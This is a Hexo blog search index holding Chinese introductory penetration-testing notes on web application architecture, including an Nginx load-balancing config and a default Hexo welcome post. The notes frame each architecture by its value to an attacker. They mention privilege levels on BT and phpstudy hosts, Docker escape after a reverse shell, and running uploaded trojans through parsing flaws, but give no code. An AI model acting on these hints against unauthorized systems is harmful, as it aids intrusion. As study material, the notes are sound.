title="负载均衡"></a>负载均衡</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;原理：分摊到多个操作单元上进行执行，共同完成工作任务<br>&nbsp;&nbsp;&nbsp;&nbsp;影响：有多个服务器加载服务，测试过程中存在多个目标情况<br>&nbsp;&nbsp;&nbsp;&nbsp;演示：Nginx负载均衡配置<br>&nbsp;&nbsp;&nbsp;&nbsp;Windows2012 + BT宝塔面板 + Nginx  </p><h2 id="定义负载设置"><a href="#定义负载设置" class="headerlink" title="定义负载设置"></a>定义负载设置</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">upstream fzjh&#123;</span><br><span class="line">server <span class="number">47.94</span><span class="number">.236</span><span class="number">.117</span>:<span class="number">80</span> weight=<span class="number">2</span>;</span><br><span class="line">server <span class="number">47.122</span><span class="number">.22</span><span class="number">.195</span>:<span class="number">80</span> weight=<span class="number">1</span>;</span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><h2 id="定义访问路径-访问策略"><a href="#定义访问路径-访问策略" class="headerlink" title="定义访问路径 访问策略"></a>定义访问路径 访问策略</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">location / &#123;  </span><br><span class="line">    proxy_pass http:<span class="comment">//fzjh/;  </span></span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 基础入门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2基础入门-应用架构</title>
      <link href="/2023/10/02/2%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E5%BA%94%E7%94%A8%E6%9E%B6%E6%9E%84/"/>
      <url>/2023/10/02/2%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E5%BA%94%E7%94%A8%E6%9E%B6%E6%9E%84/</url>
      
        <content type="html"><![CDATA[<h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p>见 <a href="http://z7yy.top/2023/10/02/1%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E5%BA%94%E7%94%A8%E6%9E%B6%E6%9E%84/">1基础入门</a></p><h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><ul><li>1、Web常规-系统 &amp; 中间件 &amp; 数据库 &amp; 源码等</li><li>2、Web其他-前后端 &amp; 软件 &amp; Docker &amp; 分配站等</li><li>3、Web拓展-CDN &amp; WAF &amp; OSS &amp; 静态 &amp; 负载均衡等</li></ul><h2 id="章节点"><a href="#章节点" class="headerlink" title="章节点"></a>章节点</h2><ul><li>应用架构：Web&#x2F;APP&#x2F;云应用&#x2F;三方服务&#x2F;负载均衡等</li><li>安全产品：CDN&#x2F;WAF&#x2F;IDS&#x2F;IPS&#x2F;蜜罐&#x2F;防火墙&#x2F;杀毒等</li><li>渗透命令：文件上传下载&#x2F;端口服务&#x2F;Shell反弹等</li><li>抓包技术：HTTP&#x2F;TCP&#x2F;UDP&#x2F;ICMP&#x2F;DNS&#x2F;封包&#x2F;代理等</li><li>算法加密：数据编码&#x2F;密码算法&#x2F;密码保护&#x2F;反编译&#x2F;加壳等</li></ul><h2 id="常规化"><a href="#常规化" class="headerlink" title="常规化"></a>常规化</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;原理：源码数据都在同服务器<br>&nbsp;&nbsp;&nbsp;&nbsp;影响：无，常规安全测试手法   </p><h2 id="站库分离："><a href="#站库分离：" class="headerlink" title="站库分离："></a>站库分离：</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;原理：源码数据库不在同服务器<br>&nbsp;&nbsp;&nbsp;&nbsp;存储：其他服务器上数据库&amp;云数据库产品<br>&nbsp;&nbsp;&nbsp;&nbsp;影响：数据被单独存放，能连接才可影响数据  </p><h2 id="前后端分离"><a href="#前后端分离" class="headerlink" title="前后端分离"></a>前后端分离</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;原理：前端JS框架，API传输数据<br>&nbsp;&nbsp;&nbsp;&nbsp;影响：<br>&nbsp;&nbsp;&nbsp;&nbsp;1、前端页面大部分不存在漏洞<br>&nbsp;&nbsp;&nbsp;&nbsp;2、后端管理大部分不在同域名<br>&nbsp;&nbsp;&nbsp;&nbsp;3、获得权限有可能不影响后端（可能不在同一域名下)  </p><h2 id="宝塔-Phpstudy"><a href="#宝塔-Phpstudy" class="headerlink" title="宝塔+Phpstudy"></a>宝塔+Phpstudy</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;原理：打包类集成化环境，权限配置或受控制<br>&nbsp;&nbsp;&nbsp;&nbsp;影响：攻击者权限对比区别<br>&nbsp;&nbsp;&nbsp;&nbsp;通常情况下，对于宝塔linux搭建的网站，获取的权限为www-data，该权限只能查看当前wwwroot路径下的文件，权限低，可以考虑进一步提权；对于phpstudy搭建的网站，通常多数为windows，再没有新建用户的情况下，直接拿到的权限就是administrator 无需提权即可满足多数情况的操作，这就是对于集成化环境搭建网站最主要的区别。</p><h2 id="Docker容器"><a href="#Docker容器" class="headerlink" title="Docker容器"></a>Docker容器</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;原理：虚拟化技术独立磁盘空间，非真实物理环境<br>&nbsp;&nbsp;&nbsp;&nbsp;影响：攻击者虚拟空间磁盘<br>&nbsp;&nbsp;&nbsp;&nbsp;(获取的权限是一小块虚拟空间——&gt;docker逃逸)<br>&nbsp;&nbsp;&nbsp;&nbsp;该类站点在拿到权限之后，例如反弹shell之后，可以明显的看见主机名为一串数字，权限为root，文件目录中存在docker等文件夹或文件，此类情况下，在存在docker配置不当，或者内核存在漏洞的情况下，可以进行虚拟机逃逸。如果不能逃逸，只能就此结束。</p><h2 id="建站分配站"><a href="#建站分配站" class="headerlink" title="建站分配站"></a>建站分配站</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;1.托管<br>&nbsp;&nbsp;&nbsp;&nbsp;2.申请<br>&nbsp;&nbsp;&nbsp;&nbsp;原理：利用别人域名模版建立<br>&nbsp;&nbsp;&nbsp;&nbsp;影响：实质安全测试非目标资产<br>&nbsp;&nbsp;&nbsp;&nbsp;(网站搭建借助平台——&gt;查域名与网站内容是否相符)<br>&nbsp;&nbsp;&nbsp;&nbsp;例：博客园、凡客建站等</p><h2 id="静态Web"><a href="#静态Web" class="headerlink" title="静态Web"></a>静态Web</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;例子：大学学的html设计的网站<br>&nbsp;&nbsp;&nbsp;&nbsp;原理：数据没有传输性（js传输不算）<br>&nbsp;&nbsp;&nbsp;&nbsp;影响：无漏洞  </p><h2 id="伪静态"><a href="#伪静态" class="headerlink" title="伪静态"></a>伪静态</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;动态转为静态技术，伪装的静态(似是静态实则是动态，不唯一)<br>&nbsp;&nbsp;&nbsp;&nbsp;还是利用动态网站的测试方法进行测试</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 基础入门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>1基础入门-应用架构</title>
      <link href="/2023/10/02/1%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E5%BA%94%E7%94%A8%E6%9E%B6%E6%9E%84/"/>
      <url>/2023/10/02/1%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E5%BA%94%E7%94%A8%E6%9E%B6%E6%9E%84/</url>
      
        <content type="html"><![CDATA[<h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p><img src="/2023/10/02/1%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E5%BA%94%E7%94%A8%E6%9E%B6%E6%9E%84/image1.png" alt="思维导图"></p><h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><ul><li>1、Web常规-系统&amp;中间件&amp;数据库&amp;源码等</li><li>2、Web其他-集成软件&amp;Docker容器&amp;分配站等<br>  分配站–大域名分配给用户的 免费或收费的网站  （网校系统…）<br>集成软件—宝塔BT…</li><li>3、Web拓展-CDN&amp;WAF&amp;OSS&amp;静态&amp;负载均衡等<br>  OSS对象存储—文件上传漏洞失效</li></ul><h2 id="章节点"><a href="#章节点" class="headerlink" title="章节点"></a>章节点</h2><ul><li>应用架构：Web&#x2F;APP&#x2F;云应用&#x2F;三方服务&#x2F;负载均衡等</li><li>安全产品：CDN&#x2F;WAF&#x2F;IDS&#x2F;IPS&#x2F;蜜罐&#x2F;防火墙&#x2F;杀毒等</li><li>渗透命令：文件上传下载&#x2F;端口服务&#x2F;Shell反弹等</li><li>抓包技术：HTTP&#x2F;TCP&#x2F;UDP&#x2F;ICMP&#x2F;DNS&#x2F;封包&#x2F;代理等</li><li>算法加密：数据编码&#x2F;密码算法&#x2F;密码保护&#x2F;反编译&#x2F;加壳等</li></ul><h2 id="常规的Web应用搭建："><a href="#常规的Web应用搭建：" class="headerlink" title="常规的Web应用搭建："></a>常规的Web应用搭建：</h2><ul><li>1、购买云服务器，购买域名</li><li>2、云服务器去搭建中间件</li><li>3、下载并上传Web程序源码</li><li>4、添加网站并绑定域名目录</li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li><p>0、知道Web必备四大件作用<br>  系统、中间件、数据库、源码</p></li><li><p>1、知道网站有哪些形式展示  </p></li><li><p> 子域名模式：<br> <a href="http://www.xiaodi8.com/">www.xiaodi8.com</a>         –zblog asp程序<br> xiaodi.xiaodi8.com      –wordpress php程序<br> bbs.xiaodi8.com         –论坛 dz程序<br> oa.xiaodi8.com          –OA  通达OA<br> 端口模式：<br> <a href="http://www.xiaodi8.com/">www.xiaodi8.com</a>         –zblog asp程序<br> <a href="http://www.xiaodi8.com:8080/">www.xiaodi8.com:8080</a>    –wordpress php程序<br> 目录模式：<br> <a href="http://www.xiaosedi123.fun/">http://www.xiaosedi123.fun/</a>        –zblog asp程序<br> <a href="http://www.xiaosedi123.fun/bbs">http://www.xiaosedi123.fun/bbs</a>     –论坛 dz程序<br> 其他：<br> 集成软件    Docker容器    分配站等</p></li><li><p>2、知道源码和URL访问对应关系  </p></li><li><p>3、知道源码有加密开源闭源类型<br>   Web程序源码：（源码是否能拿到手）<br>   开源—-商业—-自写<br>   开源—源码可见&#x2F;源码不可见（加密&#x2F;语言特性决定）<br>   &nbsp;&nbsp;&nbsp;&nbsp;可见–白盒测试-代码审计<br>   路由访问—mvc源码 Java python（有些目录存在但里面文件访问不到）–URL和文件目录对应不上 要根据配饰路由决定<br>   常规访问—URL和文件目录对应上–根据网站目录访问对应文件</p></li><li><p>4、知道文件访问解析由什么决定<br>  媒体类型（通常称为 Multipurpose Internet Mail Extensions 或 MIME 类型）是一种标准，用来表示文档、文件或字节流的性质和格式，通过该规则我们能够根据文件的后缀来解析指定的文件格式，某些网站会存在解析漏洞，我们可以将木马文件上传后，通过修改解析规则来执行木马—-注意权限</p></li><li><p>5、知道数据库存储数据站库分离<br>  本地存储–网站和数据库在同一个服务器<br>  站库分离–网站和数据库不在同一个服务器<br>  云数据库–网站文件不存储在本地，而是在OSS中  </p></li><li><p>6、知道中间件配置影响后续手法<br>  一次web访问的顺序，web浏览器-&gt;web服务器（狭义）-&gt;web容器-&gt;应用服务器-&gt;数据库服务器<br>  详情可以参考：<a href="https://zhuanlan.zhihu.com/p/473453245">知乎-平台安全之中间件安全</a>  </p></li><li><p>7、知道常规真实Web搭建解析流程</p></li><li><p>8、思考为什么要学习掌握这些东西</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 基础入门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2023/09/29/hello-world/"/>
      <url>/2023/09/29/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
